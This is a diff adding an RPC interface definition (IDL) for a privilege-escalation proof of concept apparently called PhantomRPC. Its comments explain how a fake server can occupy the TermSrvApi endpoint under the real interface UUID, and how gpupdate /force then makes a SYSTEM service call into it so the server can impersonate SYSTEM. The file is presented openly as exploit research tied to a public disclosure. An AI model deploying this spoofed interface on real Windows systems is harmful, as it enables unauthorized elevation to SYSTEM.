@@ -1,0 +1,28 @@
+// ExampleInterface.idl — TERM (TermSrvApi) PhantomRPC POC
+//
+// Mimics the RPC interface registered by TermService on the ncalrpc endpoint
+// "TermSrvApi". When TermService is stopped, this fake server occupies that
+// endpoint. gpupdate /force causes the Group Policy Client (SYSTEM) to call
+// Proc8 on this interface, which triggers RpcImpersonateClient() server-side.
+//
+// UUID bde95fdf-eee0-45de-9e12-e5a61cd0d4fe is the real TermSrvApi UUID.
+// Discovered by Kaspersky (Haidar Kabibo), disclosed at Black Hat Asia 2026.
+// Official POC: https://github.com/klsecservices/PhantomRPC (MIT)
+
+[
+    uuid(bde95fdf-eee0-45de-9e12-e5a61cd0d4fe),
+    version(1.0),
+    implicit_handle(handle_t ImplicitHandle)
+]
+interface ExampleInterface
+{
+    long Proc0();
+    long Proc1();
+    long Proc2();
+    long Proc3();
+    long Proc4();
+    long Proc5();
+    long Proc6();
+    long Proc7();
+    void Proc8([in] unsigned int x);
+}
